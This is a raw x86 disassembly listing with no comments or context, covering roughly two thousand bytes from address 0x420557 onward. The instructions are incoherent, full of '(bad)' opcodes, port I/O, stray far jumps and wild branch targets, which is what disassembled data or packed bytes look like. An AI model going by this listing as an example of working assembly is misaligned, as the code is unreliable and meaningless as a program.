  420557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420558:	les    eax,FWORD PTR [eax+0x19]
  42055b:	mov    WORD PTR [ebp+0x3f710aff],ds
  420561:	dec    edx
  420562:	mov    esp,ss
  420564:	std    
  420565:	cmp    dh,bh
  420567:	add    BYTE PTR [ebx],0xef
  42056a:	bound  ecx,QWORD PTR [esi]
  42056c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42056d:	sbb    DWORD PTR [ebx-0x56],edi
  420570:	mov    dh,0xee
  420572:	ret    
  420573:	stos   DWORD PTR es:[edi],eax
  420574:	out    0x9b,eax
  420576:	adc    DWORD PTR [edi-0x5858abfa],0xffffff8d
  42057d:	push   es
  42057e:	bound  eax,QWORD PTR [ebx]
  420580:	in     eax,0x13
  420582:	xchg   edi,eax
  420583:	or     edx,0x26015cb6
  420589:	or     DWORD PTR [ebx],esp
  42058b:	rol    BYTE PTR [esi+0x3653c15e],1
  420591:	ret    0x810d
  420594:	pop    ebp
  420595:	addr16 cdq 
  420597:	jnp    0x420597
  420599:	add    BYTE PTR cs:[bx+si],bh
  42059d:	sbb    eax,0xcbf71dc6
  4205a2:	add    DWORD PTR [eax-0x5f],edi
  4205a5:	lds    ecx,FWORD PTR [ecx-0x5]
  4205a8:	inc    esp
  4205a9:	in     eax,0xe8
  4205ab:	not    dl
  4205ad:	aaa    
  4205ae:	dec    esi
  4205af:	pop    ss
  4205b0:	inc    ecx
  4205b1:	xor    ebx,DWORD PTR [edx-0x59]
  4205b4:	cs xchg esi,eax
  4205b6:	out    0xb2,eax
  4205b8:	in     eax,0xba
  4205ba:	mov    ds:0x4b38a067,eax
  4205bf:	push   0xef44d171
  4205c4:	cmp    al,0x21
  4205c6:	fcmovnb st,st(6)
  4205c8:	fs xchg esp,esp
  4205cb:	imul   ebp,DWORD PTR [ebx],0x65ed9116
  4205d1:	icebp  
  4205d2:	addr16 push cs
  4205d4:	xchg   ebp,eax
  4205d5:	iret   
  4205d6:	imul   edx,ebx,0xd2fcffe3
  4205dc:	(bad)  
  4205dd:	out    0xa8,eax
  4205df:	lahf   
  4205e0:	ins    BYTE PTR es:[edi],dx
  4205e1:	stc    
  4205e2:	sbb    BYTE PTR [esi+0x23e91f87],cl
  4205e8:	sbb    BYTE PTR [edx],bl
  4205ea:	loope  0x42063b
  4205ec:	or     BYTE PTR [edi+edi*4],al
  4205ef:	sbb    BYTE PTR [eax+0x5c],ah
  4205f2:	mov    cl,0xfb
  4205f4:	cmc    
  4205f5:	lea    ecx,[ebx+0x3b48f9a5]
  4205fb:	xor    eax,0xcd7d91b6
  420600:	ror    BYTE PTR [esi],0x5e
  420603:	imul   esi,DWORD PTR [ebp+0x10a4e30a],0xffffffea
  42060a:	jmp    0x6bde75f7
  42060f:	jbe    0x42061d
  420611:	add    DWORD PTR [edx+0x2d],ebp
  420614:	jle    0x420675
  420616:	cmp    eax,0x8bdee44f
  42061b:	retf   0x2d54
  42061e:	fdiv   DWORD PTR [edx]
  420620:	adc    DWORD PTR [eax],0xffffffd6
  420623:	push   esi
  420624:	add    DWORD PTR [ecx+ebp*2+0x40c016b3],ebx
  42062b:	les    ebp,FWORD PTR [ebx+0x45c20f47]
  420631:	jmp    0xc66f14d4
  420636:	sub    bh,0x5f
  420639:	xchg   edi,eax
  42063a:	jmp    0xa8540e57
  42063f:	gs pop es
  420641:	adc    BYTE PTR [eax],bl
  420643:	not    BYTE PTR [ecx]
  420645:	sbb    ah,BYTE PTR [esi-0x60]
  420648:	(bad)  
  420649:	and    eax,0xf0f147e8
  42064e:	ret    0xd804
  420651:	dec    esp
  420652:	cdq    
  420653:	mov    DWORD PTR [edx+0x75e158f6],ebx
  420659:	adc    cl,BYTE PTR [edx-0x1]
  42065c:	mov    ds:0x2265988d,eax
  420661:	xchg   edx,eax
  420662:	data16 jo 0x4206b3
  420665:	cwde   
  420666:	mov    esp,0x2c53d17a
  42066b:	adc    al,0xfe
  42066d:	jb     0x42061d
  42066f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420670:	es jnp 0x42064e
  420673:	add    al,0x35
  420675:	sbb    BYTE PTR [ebx-0x1b924ea5],dh
  42067b:	ja     0x420623
  42067d:	xchg   ebx,eax
  42067e:	das    
  42067f:	add    DWORD PTR [eax+0x64],edi
  420682:	dec    eax
  420683:	sub    ebx,esi
  420685:	mov    ebx,0x42896ae8
  42068a:	adc    eax,0x3342d265
  42068f:	stos   DWORD PTR es:[edi],eax
  420690:	push   ebp
  420691:	inc    edx
  420692:	(bad)  
  420693:	(bad)
  420696:	pop    edx
  420697:	inc    edi
  420698:	test   ecx,0x7fd758d7
  42069e:	push   ecx
  42069f:	fisttp QWORD PTR [ebx]
  4206a1:	and    al,0x3f
  4206a3:	xchg   ebp,ebx
  4206a5:	xchg   edi,eax
  4206a6:	push   es
  4206a7:	cmp    edx,DWORD PTR [eax]
  4206a9:	test   eax,0x6eb15baa
  4206ae:	repz jns 0x4206e5
  4206b1:	jle    0x420715
  4206b3:	sub    edx,DWORD PTR [ebx+0x56]
  4206b6:	pop    ds
  4206b7:	sbb    ch,BYTE PTR [ebx-0x358c34ae]
  4206bd:	enter  0xe083,0xea
  4206c1:	jl     0x420742
  4206c3:	push   edi
  4206c4:	jp     0x42070e
  4206c6:	stos   DWORD PTR es:[edi],eax
  4206c7:	xor    DWORD PTR [ebx-0x41],0xffffffd3
  4206cb:	add    BYTE PTR [ebp+0x70],0xc
  4206cf:	clc    
  4206d0:	dec    esp
  4206d1:	push   0x5b693427
  4206d6:	mov    ebx,0x175e19cb
  4206db:	mov    bh,0xda
  4206dd:	dec    ecx
  4206de:	test   DWORD PTR [eax+0x67023cbe],eax
  4206e4:	pop    ebx
  4206e5:	iret   
  4206e6:	les    edx,FWORD PTR [ebp+0x1b9b494c]
  4206ec:	inc    ecx
  4206ed:	arpl   WORD PTR [edx-0x5eef82ba],ax
  4206f3:	ret    0x7d6c
  4206f6:	outs   dx,DWORD PTR ds:[esi]
  4206f7:	arpl   WORD PTR [esi+0x419d1d18],dx
  4206fd:	data16 fdivp st(5),st
  420700:	aad    0x31
  420702:	jp     0x42071a
  420704:	mov    bh,0x2b
  420706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420707:	mov    esp,0xc226cd57
  42070c:	sbb    ch,dl
  42070e:	fwait
  42070f:	cmp    DWORD PTR [ebp-0x78b5a8ac],edi
  420715:	cli    
  420716:	xchg   edx,eax
  420717:	mov    ebp,0x7bdcd186
  42071c:	enter  0xf548,0xf
  420720:	adc    edi,esi
  420722:	mov    dh,0xc8
  420724:	mov    ecx,DWORD PTR [ecx]
  420726:	test   DWORD PTR [ebx-0x1a0bc427],0x3a51766
  420730:	sbb    DWORD PTR [esi-0x72f85fa3],edi
  420736:	push   esp
  420737:	ret    
  420738:	loopne 0x4206e7
  42073a:	xor    BYTE PTR [ebx],ch
  42073c:	or     al,0x24
  42073e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42073f:	aad    0x66
  420741:	inc    eax
  420742:	sbb    BYTE PTR [eax-0x4b],ah
  420745:	dec    esi
  420746:	mov    esp,DWORD PTR [esi-0x13]
  420749:	adc    bl,dl
  42074b:	int3   
  42074c:	pop    es
  42074d:	xchg   al,bh
  42074f:	aaa    
  420750:	or     ebp,DWORD PTR [ecx-0x27]
  420753:	sar    DWORD PTR [ecx],1
  420755:	mov    cl,0x3
  420757:	mov    ebp,0xfd5bd8b0
  42075c:	mov    edx,0x8242500e
  420761:	test   BYTE PTR [edi],0x5a
  420764:	or     dl,BYTE PTR [esi+0x1c]
  420767:	fsubr  DWORD PTR [ebx]
  420769:	push   eax
  42076a:	pop    ebx
  42076b:	ins    DWORD PTR es:[edi],dx
  42076c:	popf   
  42076d:	dec    eax
  42076e:	mov    ebp,0x3d982e27
  420773:	mov    ch,0x91
  420775:	shr    DWORD PTR [ebp-0x3],cl
  420778:	hlt    
  420779:	int3   
  42077a:	shl    bl,cl
  42077c:	aad    0xb9
  42077e:	mov    bh,0x48
  420780:	cs into 
  420782:	lea    edi,[edi+0x50413b4d]
  420788:	lods   eax,DWORD PTR ds:[esi]
  420789:	dec    ebx
  42078a:	icebp  
  42078b:	mov    esi,DWORD PTR [eax]
  42078d:	mov    ah,0xe8
  42078f:	cli    
  420790:	out    0x43,eax
  420792:	jnp    0x42078d
  420794:	adc    BYTE PTR [ecx-0x12b8598b],dl
  42079a:	into   
  42079b:	rol    BYTE PTR [eax+eiz*1],cl
  42079e:	jno    0x42072a
  4207a0:	add    esp,esp
  4207a2:	popf   
  4207a3:	fcmove st,st(4)
  4207a5:	pop    es
  4207a6:	xlat   BYTE PTR ds:[ebx]
  4207a7:	mov    DWORD PTR [edi-0x56],ebp
  4207aa:	xor    al,0x50
  4207ac:	out    0x86,eax
  4207ae:	or     al,0xe8
  4207b0:	inc    esi
  4207b1:	and    eax,0x2812b176
  4207b6:	les    eax,FWORD PTR [edi]
  4207b8:	adc    edx,esi
  4207ba:	(bad)  
  4207bc:	(bad)  
  4207bd:	fldcw  WORD PTR [eax]
  4207bf:	les    edi,FWORD PTR [eax+0x2]
  4207c2:	mov    ah,0x4d
  4207c4:	clc    
  4207c5:	ins    DWORD PTR es:[edi],dx
  4207c6:	jl     0x4207dc
  4207c8:	hlt    
  4207c9:	fcomp  QWORD PTR [eax-0x2f]
  4207cc:	sub    al,0xcf
  4207ce:	jne    0x420751
  4207d0:	jno    0x42078a
  4207d2:	jl     0x420763
  4207d4:	push   0x8f3c9eee
  4207d9:	mov    bh,0x96
  4207db:	test   DWORD PTR [edi],0xa6e8685c
  4207e1:	mov    ah,0x6f
  4207e3:	add    al,0x1a
  4207e5:	or     DWORD PTR ds:0x7fc9d770,ebp
  4207eb:	fstp   QWORD PTR [ecx-0xef3732f]
  4207f1:	jl     0x420818
  4207f3:	jb     0x420854
  4207f5:	fwait
  4207f6:	or     eax,0x5091d348
  4207fb:	lahf   
  4207fc:	out    0x3,eax
  4207fe:	xchg   edi,eax
  4207ff:	jp     0x420843
  420801:	xchg   esp,eax
  420802:	cmp    ch,BYTE PTR [ebp+0x625757d0]
  420808:	jne    0x420810
  42080a:	outs   dx,BYTE PTR ds:[esi]
  42080b:	xchg   esp,eax
  42080c:	and    BYTE PTR [ebp-0x74],al
  42080f:	mov    esi,0x8a172681
  420814:	jnp    0x420823
  420816:	sub    edx,edi
  420818:	stos   DWORD PTR es:[edi],eax
  420819:	jns    0x420897
  42081b:	daa    
  42081c:	push   esi
  42081d:	jb     0x4207c2
  42081f:	jo     0x420830
  420821:	lock ja 0x42089e
  420824:	sbb    eax,0x687e2e5a
  420829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42082a:	test   al,0xbe
  42082c:	sti    
  42082d:	push   cs
  42082e:	in     eax,dx
  42082f:	fstp   TBYTE PTR [edx]
  420831:	mov    esp,0xe0d8aa9e
  420836:	add    DWORD PTR [ecx],ebp
  420838:	idiv   bl
  42083a:	stos   BYTE PTR es:[edi],al
  42083b:	ret    0x83ee
  42083e:	add    dl,BYTE PTR [edi+0x36]
  420841:	fisubr DWORD PTR [ecx-0x42245bd4]
  420847:	xor    al,0x4a
  420849:	jnp    0x42081e
  42084b:	xchg   esp,eax
  42084c:	(bad)  
  42084d:	adc    eax,0xd5d65fd8
  420852:	neg    DWORD PTR [edi]
  420854:	lea    ebp,[eax+0x2b]
  420857:	xchg   BYTE PTR [eax-0x1477ddd1],dl
  42085d:	test   DWORD PTR [eax+0x18],edi
  420860:	in     eax,0xf2
  420862:	sbb    ch,dh
  420864:	and    ch,al
  420866:	mov    eax,ds:0x4b5f3e36
  42086b:	int    0x82
  42086d:	and    eax,0x10b20951
  420872:	xchg   esp,eax
  420873:	in     eax,0xf8
  420875:	and    eax,0xd9c5c6d
  42087a:	out    0xbf,al
  42087c:	cwde   
  42087d:	cmc    
  42087e:	jnp    0x4208f9
  420880:	out    0x3c,al
  420882:	mov    ebx,0x8ec262ff
  420887:	ret    
  420888:	add    eax,0x99cf0144
  42088d:	xchg   esp,eax
  42088e:	les    esi,FWORD PTR [edx-0x49]
  420891:	int    0x82
  420893:	pop    ebp
  420894:	cdq    
  420895:	push   0x48a8beb0
  42089a:	and    BYTE PTR [eax+0xf8b4bd2],bh
  4208a0:	js     0x4208e9
  4208a2:	pop    es
  4208a3:	push   esp
  4208a4:	jbe    0x4208bc
  4208a6:	push   DWORD PTR [eax+ebp*2-0x4d36d48]
  4208ad:	xchg   ebp,eax
  4208ae:	outs   dx,DWORD PTR ds:[esi]
  4208af:	cmp    DWORD PTR [edi+0x1ba5724f],ebp
  4208b5:	fbld   TBYTE PTR ds:0xe2ac289e
  4208bb:	push   0xffffffcf
  4208bd:	test   DWORD PTR ds:0xa05ac5d2,ebx
  4208c3:	add    eax,0x66c8bdae
  4208c8:	out    dx,eax
  4208c9:	xor    eax,0x6072e31
  4208ce:	dec    esi
  4208cf:	test   BYTE PTR [edi],bh
  4208d1:	js     0x4208bd
  4208d3:	neg    DWORD PTR [esi]
  4208d5:	arpl   WORD PTR [ebx],dx
  4208d7:	cld    
  4208d8:	pop    es
  4208d9:	cmc    
  4208da:	mov    al,0x28
  4208dc:	lea    edi,[edi+0x28499484]
  4208e2:	sbb    eax,0xdf6af3e2
  4208e7:	xor    ah,dl
  4208e9:	sub    BYTE PTR [eax+0x4a06b62c],bh
  4208ef:	out    dx,al
  4208f0:	int    0xfd
  4208f2:	xchg   ebp,eax
  4208f3:	jns    0x420962
  4208f5:	push   cs
  4208f6:	mov    ah,0x9
  4208f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208f9:	cmp    eax,esp
  4208fb:	mov    ah,0x84
  4208fd:	es (bad) 
  4208ff:	addr16 (bad) 
  420901:	test   al,0x1f
  420903:	adc    BYTE PTR [esi-0x5c9052c3],0xd6
  42090a:	pop    edi
  42090b:	pushf  
  42090c:	(bad)  
  42090d:	jo     0x42097a
  42090f:	push   ds
  420910:	int3   
  420911:	sub    al,bh
  420913:	jmp    0x420955
  420915:	xor    bh,BYTE PTR [ebp+0x2a]
  420918:	mov    al,0xa8
  42091a:	shl    BYTE PTR [edx+0x664e07f7],0x20
  420921:	jl     0x4208fe
  420923:	or     esp,DWORD PTR [esi]
  420925:	scas   eax,DWORD PTR es:[edi]
  420926:	test   BYTE PTR [esi],bl
  420928:	jp     0x420906
  42092a:	inc    ecx
  42092b:	add    al,0x59
  42092d:	or     DWORD PTR [ecx+0x48],ebp
  420930:	push   ebx
  420931:	repz inc esp
  420933:	xchg   ecx,eax
  420934:	retf   
  420935:	cmc    
  420936:	push   ebp
  420937:	mov    ecx,DWORD PTR [ebx+0x661a10bc]
  42093d:	arpl   WORD PTR [edx],bx
  42093f:	xchg   edi,eax
  420940:	cmc    
  420941:	cmc    
  420942:	out    0x46,al
  420944:	outs   dx,DWORD PTR ds:[esi]
  420945:	hlt    
  420946:	or     bh,bl
  420948:	gs sbb eax,0x81e565ee
  42094e:	jno    0x4209a6
  420950:	popa   
  420951:	call   FWORD PTR [edx]
  420953:	mov    edx,esi
  420955:	bound  si,DWORD PTR [esp+eax*2-0x3e]
  42095a:	icebp  
  42095b:	inc    esi
  42095c:	mov    ebp,0x5fed92d8
  420961:	xlat   BYTE PTR ds:[ebx]
  420962:	push   ecx
  420963:	and    DWORD PTR [esi],edi
  420965:	mov    esp,0x985520f5
  42096a:	sbb    DWORD PTR [ebx],esi
  42096c:	test   eax,0xf2b2ca3f
  420971:	loop   0x4209a5
  420973:	mov    bh,BYTE PTR [esi]
  420975:	add    ebp,ebx
  420977:	push   edi
  420978:	dec    DWORD PTR [esi]
  42097a:	shl    BYTE PTR [ecx],cl
  42097c:	push   esi
  42097d:	dec    ebp
  42097e:	inc    ecx
  42097f:	jb     0x42098a
  420981:	mov    al,0x6a
  420983:	outs   dx,DWORD PTR ds:[esi]
  420984:	sbb    DWORD PTR [ebx-0x6dec8fa0],0xffffffde
  42098b:	in     al,dx
  42098c:	aas    
  42098d:	or     esi,DWORD PTR [eax+0x5f]
  420990:	lahf   
  420991:	add    edx,eax
  420993:	hlt    
  420994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420995:	lds    esi,FWORD PTR [eax-0x2c]
  420998:	stos   BYTE PTR es:[edi],al
  420999:	inc    ebx
  42099a:	nop
  42099b:	imul   edi,DWORD PTR [eax-0x6f],0x56
  42099f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a0:	pop    eax
  4209a1:	jmp    0x420938
  4209a3:	jmp    0x7b63:0x34be62ef
  4209aa:	mov    al,0xdf
  4209ac:	adc    esi,DWORD PTR [eax+0x75ffbb75]
  4209b2:	push   edx
  4209b3:	push   esp
  4209b4:	(bad)  
  4209b5:	scas   al,BYTE PTR es:[edi]
  4209b6:	pusha  
  4209b7:	pop    es
  4209b8:	push   edi
  4209b9:	push   es
  4209ba:	icebp  
  4209bb:	mov    ebp,0xebd4bb42
  4209c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c1:	push   ebx
  4209c2:	sbb    al,0xc3
  4209c4:	fisubr DWORD PTR [edi+0x2bb660bc]
  4209ca:	fs dec esp
  4209cc:	xchg   edx,eax
  4209cd:	int3   
  4209ce:	mov    DWORD PTR [esi-0x3dfd3e41],esp
  4209d4:	aam    0xc5
  4209d6:	and    eax,0xe02af85c
  4209db:	xchg   ecx,eax
  4209dc:	icebp  
  4209dd:	pop    ebx
  4209de:	imul   esi,DWORD PTR ds:0xb1523b05,0x738bcdd9
  4209e8:	jne    0x420a10
  4209ea:	repz into 
  4209ec:	mov    ?,edi
  4209ee:	inc    ecx
  4209ef:	jg     0x420a35
  4209f1:	je     0x4209b3
  4209f3:	div    DWORD PTR [edx]
  4209f5:	mov    edi,DWORD PTR ss:[esi-0x5b]
  4209f9:	nop
  4209fa:	xchg   ebx,eax
  4209fb:	repz pop ecx
  4209fd:	outs   dx,DWORD PTR ds:[esi]
  4209fe:	ret    0x7546
  420a01:	push   eax
  420a02:	xchg   ecx,eax
  420a03:	pushf  
  420a04:	or     DWORD PTR [ebx],eax
  420a06:	lods   al,BYTE PTR ds:[esi]
  420a07:	dec    ecx
  420a08:	adc    BYTE PTR [eax+0x30],ah
  420a0b:	adc    BYTE PTR [ecx],bh
  420a0d:	xor    BYTE PTR [ebx],0xcd
  420a10:	xchg   esi,eax
  420a11:	pop    eax
  420a12:	lahf   
  420a13:	icebp  
  420a14:	pop    ecx
  420a15:	mov    bl,0x55
  420a17:	and    DWORD PTR [ecx-0x20],edx
  420a1a:	ret    
  420a1b:	cmp    DWORD PTR [ebx+eax*4+0x10],ebp
  420a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a20:	mov    al,0x38
  420a22:	mov    edx,0x9ba96144
  420a27:	push   0xb6c36e12
  420a2c:	pop    ebx
  420a2d:	xor    bl,BYTE PTR [ebx+0x42]
  420a30:	push   ds
  420a31:	loop   0x420a5b
  420a33:	and    BYTE PTR [esi],dl
  420a35:	jno    0x420a00
  420a37:	mov    ebp,0x59d6f78b
  420a3c:	xor    ch,BYTE PTR fs:[ebp+0x7b]
  420a40:	mov    esp,0xe7aac1ca
  420a45:	jns    0x4209ef
  420a47:	popa   
  420a48:	mov    ds:0x7bd461e5,al
  420a4d:	dec    ecx
  420a4e:	pushf  
  420a4f:	leave  
  420a50:	cld    
  420a51:	mov    bl,0x57
  420a53:	push   0xe48c8cb9
  420a58:	sbb    edi,DWORD PTR [edx-0x2c86a21]
  420a5e:	stc    
  420a5f:	lods   al,BYTE PTR ds:[esi]
  420a60:	pop    es
  420a61:	in     eax,dx
  420a62:	adc    al,0x84
  420a64:	pop    ss
  420a65:	jnp    0x4209f8
  420a67:	imul   esp,DWORD PTR [ecx+0x6e87302a],0xd605d89b
  420a71:	(bad)  
  420a72:	loop   0x420a2d
  420a74:	leave  
  420a75:	xor    esp,ebx
  420a77:	dec    esi
  420a78:	jbe    0x420a1a
  420a7a:	sub    al,BYTE PTR [ecx+0x56927388]
  420a80:	xchg   edx,eax
  420a81:	neg    DWORD PTR [ebp+0x49b03769]
  420a87:	cmp    eax,0xe49064cb
  420a8c:	imul   ebx,DWORD PTR [eax],0xd39eeed6
  420a92:	add    BYTE PTR ds:0x9f7aaabf,dh
  420a98:	inc    ebp
  420a99:	imul   eax,DWORD PTR [edi-0x7],0xb
  420a9d:	add    esp,edx
  420a9f:	pop    edi
  420aa0:	dec    esp
  420aa1:	in     al,0x9f
  420aa3:	mov    edx,0x2a29e8e3
  420aa8:	das    
  420aa9:	out    0xee,eax
  420aab:	pop    ds
  420aac:	mov    ah,0xf1
  420aae:	mov    DWORD PTR [ecx+0x4afa4961],ebp
  420ab4:	outs   dx,DWORD PTR ds:[esi]
  420ab5:	add    eax,0x6fbb4a
  420aba:	in     al,dx
  420abb:	jecxz  0x420aa1
  420abd:	mov    cl,0x83
  420abf:	cmp    bl,BYTE PTR [edi]
  420ac1:	mov    ebp,0xe0b081d9
  420ac6:	dec    edx
  420ac7:	mov    dh,al
  420ac9:	ss int3 
  420acb:	cli    
  420acc:	jge    0x420b01
  420ace:	pop    edi
  420acf:	cmovg  edi,DWORD PTR gs:[edx+0x58]
  420ad4:	int3   
  420ad5:	mov    bh,BYTE PTR [esp+edx*2]
  420ad8:	js     0x420b0d
  420ada:	in     eax,0x53
  420adc:	ret    0x3878
  420adf:	enter  0x6543,0x17
  420ae3:	xor    eax,0xd377db53
  420ae8:	in     eax,0x35
  420aea:	jo     0x420b20
  420aec:	jg     0x420b03
  420aee:	xchg   edi,eax
  420aef:	test   eax,0x61b73b36
  420af4:	sub    ch,ch
  420af6:	add    al,0xe0
  420af8:	outs   dx,DWORD PTR ds:[esi]
  420af9:	test   BYTE PTR [eax],0x35
  420afc:	out    0xf1,eax
  420afe:	inc    eax
  420aff:	add    dh,dh
  420b01:	mov    dh,0x17
  420b03:	ds and eax,0xa44bc4e2
  420b09:	in     eax,dx
  420b0a:	inc    eax
  420b0b:	stos   BYTE PTR es:[edi],al
  420b0c:	sbb    DWORD PTR [eax],ebp
  420b0e:	add    DWORD PTR [edi-0x36],0x5e
  420b12:	je     0x420b4f
  420b14:	and    al,0x58
  420b16:	mov    ebp,0xa0ad1e00
  420b1b:	out    dx,al
  420b1c:	aad    0x57
  420b1e:	mov    ecx,0x60a8cefe
  420b23:	out    0x4a,al
  420b25:	clc    
  420b26:	xchg   ebx,eax
  420b27:	sbb    cl,ch
  420b29:	fsubr  st(4),st
  420b2b:	gs push es
  420b2d:	sbb    eax,0xb850f0e5
  420b32:	mov    ds:0x6fddf786,eax
  420b37:	push   esi
  420b38:	rcr    DWORD PTR [edx-0x80],0x14
  420b3c:	jp     0x420b0b
  420b3e:	stc    
  420b3f:	push   0x57
  420b41:	xchg   edx,eax
  420b42:	popf   
  420b43:	push   ebx
  420b44:	xlat   BYTE PTR ds:[ebx]
  420b45:	out    dx,al
  420b46:	gs mov esi,esp
  420b49:	in     eax,0x76
  420b4b:	mov    eax,0xe2fcf80
  420b50:	enter  0x76e4,0x54
  420b54:	xchg   edx,eax
  420b55:	push   ebp
  420b56:	jbe    0x420b32
  420b58:	push   edi
  420b59:	cmp    BYTE PTR [eax+0x22],bl
  420b5c:	add    BYTE PTR [esi+eax*4+0x4571da2b],cl
  420b63:	mov    bh,0x24
  420b65:	sbb    BYTE PTR [eax],ch
  420b67:	sub    BYTE PTR [edx+0x40],0x32
  420b6b:	fiadd  DWORD PTR ds:0xeda11930
  420b71:	sar    DWORD PTR [edx+0x6b],0xe7
  420b75:	jbe    0x420bab
  420b77:	nop
  420b78:	mov    esp,0xcb71cbff
  420b7d:	jnp    0x420b33
  420b7f:	in     al,0xe3
  420b81:	fist   DWORD PTR [esi+0x39cdf830]
  420b87:	sub    al,0x50
  420b89:	fdivr  DWORD PTR [edi-0x1f]
  420b8c:	lds    edi,FWORD PTR [edi]
  420b8e:	add    BYTE PTR [ecx+0x70c0afd1],dh
  420b94:	jno    0x420b72
  420b96:	mov    al,0x75
  420b98:	je     0x420c02
  420b9a:	push   edx
  420b9b:	outs   dx,BYTE PTR ds:[esi]
  420b9c:	aad    0xf0
  420b9e:	scas   al,BYTE PTR es:[edi]
  420b9f:	pop    ebp
  420ba0:	daa    
  420ba1:	mov    ebp,0xec360
  420ba6:	add    al,BYTE PTR [eax+0x23]
  420ba9:	sbb    eax,0xcc4f899c
  420bae:	iret   
  420baf:	xchg   esp,eax
  420bb0:	les    ebp,FWORD PTR [ebx]
  420bb2:	retf   0xb74e
  420bb5:	pop    ss
  420bb6:	sahf   
  420bb7:	imul   BYTE PTR [edi+0x30721d77]
  420bbd:	adc    DWORD PTR [ebx+0x3c],esp
  420bc0:	mov    eax,0xdf57ff56
  420bc5:	mov    al,0x7d
  420bc7:	and    BYTE PTR [edi+eiz*1],dh
  420bca:	fild   WORD PTR [edx-0x48]
  420bcd:	and    DWORD PTR [ecx],0x51271f00
  420bd3:	xor    ch,BYTE PTR [esi+0x2c]
  420bd6:	jmp    0x3c4c:0xec136ea4
  420bdd:	jb     0x420b7b
  420bdf:	ficom  WORD PTR [esi]
  420be1:	sub    eax,0x4f4edcfd
  420be6:	cwde   
  420be7:	push   0x47
  420be9:	xchg   edx,eax
  420bea:	shl    DWORD PTR [esi+0x1],0x21
  420bee:	bound  edx,QWORD PTR [edi+0x73]
  420bf1:	dec    ebp
  420bf2:	jbe    0x420c66
  420bf4:	fidiv  WORD PTR [edx]
  420bf6:	aaa    
  420bf7:	pop    es
  420bf8:	daa    
  420bf9:	test   al,0x31
  420bfb:	or     BYTE PTR ss:[ebx-0x53],dh
  420bff:	out    dx,al
  420c00:	and    esi,edi
  420c02:	sbb    BYTE PTR [edi+0x64],dh
  420c05:	jbe    0x420c5d
  420c07:	dec    edx
  420c08:	adc    cl,cl
  420c0a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420c0c:	out    dx,al
  420c0d:	mov    bl,bh
  420c0f:	nop
  420c10:	dec    esp
  420c11:	sbb    dl,bl
  420c13:	ret    
  420c14:	or     DWORD PTR [ecx-0x56815d6c],esp
  420c1a:	loope  0x420c81
  420c1c:	adc    DWORD PTR [ecx+0x20],0x788466b1
  420c23:	xchg   edx,eax
  420c24:	jae    0x420bd7
  420c26:	icebp  
  420c27:	stos   BYTE PTR es:[edi],al
  420c28:	mov    ah,0x8a
  420c2a:	test   DWORD PTR [esp+esi*2-0x1c],0x789f2bac
  420c32:	or     eax,0xb4adb275
  420c37:	xchg   ebp,eax
  420c38:	aaa    
  420c39:	(bad)  
  420c3a:	sbb    esi,edx
  420c3c:	repnz rcr DWORD PTR [edx+0x32ad9939],cl
  420c43:	mov    BYTE PTR [ebp+0x3668b212],bh
  420c49:	lds    eax,FWORD PTR [ebx+0x44]
  420c4c:	sti    
  420c4d:	adc    al,BYTE PTR [ebx-0x1cad940b]
  420c53:	cmp    DWORD PTR [edi+0x1312a939],0x62ef2bc1
  420c5d:	(bad)  
  420c5e:	and    BYTE PTR [edx-0xe758b53],bh
  420c64:	leave  
  420c65:	fistp  QWORD PTR [edx]
  420c67:	int    0x7d
  420c69:	out    0xfb,eax
  420c6b:	push   ds
  420c6c:	pop    es
  420c6d:	push   ds
  420c6e:	jg     0x420c79
  420c70:	ins    BYTE PTR es:[edi],dx
  420c71:	je     0x420c47
  420c73:	sub    DWORD PTR [ecx-0x64],ecx
  420c76:	mov    dh,0x3
  420c78:	jae    0x420c6b
  420c7a:	or     ebp,DWORD PTR [ecx-0x72cc28c5]
  420c80:	mov    bh,0x6a
  420c82:	sbb    edi,DWORD PTR [ecx+eax*4-0x65]
  420c86:	xlat   BYTE PTR ds:[ebx]
  420c87:	cld    
  420c88:	ret    0x46ca
  420c8b:	and    cl,BYTE PTR [edi-0x4d]
  420c8e:	retf   0x43fc
  420c91:	jle    0x420cc6
  420c93:	push   es
  420c94:	cdq    
  420c95:	iret   
  420c96:	call   0x2fce:0xc98857de
  420c9d:	outs   dx,DWORD PTR ds:[esi]
  420c9e:	push   cs
  420c9f:	daa    
  420ca0:	cmp    eax,0x4c43a7f5
  420ca5:	sbb    bl,BYTE PTR [edx-0x1b95a3ce]
  420cab:	mov    al,ds:0xe2975eb7
  420cb0:	mov    BYTE PTR [edx-0x445c8f5d],dh
  420cb6:	sbb    eax,esp
  420cb8:	push   esp
  420cb9:	jae    0x420d0e
  420cbb:	fs fs jae 0x420ce9
  420cbf:	out    dx,al
  420cc0:	pop    esp
  420cc1:	std    
  420cc2:	cmp    DWORD PTR [edx-0x12],0xffffffc5
  420cc6:	popa   
  420cc7:	in     al,dx
  420cc8:	fisub  WORD PTR [ebp+0x4d89af63]
  420cce:	sub    ah,BYTE PTR [esi]
  420cd0:	fdivr  st,st(0)
  420cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cd3:	pop    ecx
  420cd4:	or     al,0x49
  420cd6:	jo     0x420cdf
  420cd8:	xchg   edx,eax
  420cd9:	pop    ss
  420cda:	pop    ds
  420cdb:	imul   esi,DWORD PTR [ecx-0x6ca2b953],0x7a
  420ce2:	xor    eax,0x9562fd95
  420ce7:	jns    0x8d0b642d
  420ced:	push   edx
  420cee:	mov    BYTE PTR [ebx+0x7c],0x65
  420cf2:	mov    ebp,0x892ab26b
  420cf7:	xor    dh,al
  420cf9:	cs (bad) 
  420cfb:	or     ebx,DWORD PTR [ebx+0x5c]
  420cfe:	add    dl,bl
  420d00:	loopne 0x420d22
  420d02:	inc    esp
  420d03:	pusha  
  420d04:	aas    
  420d05:	retf   0xa5f5
  420d08:	(bad)  
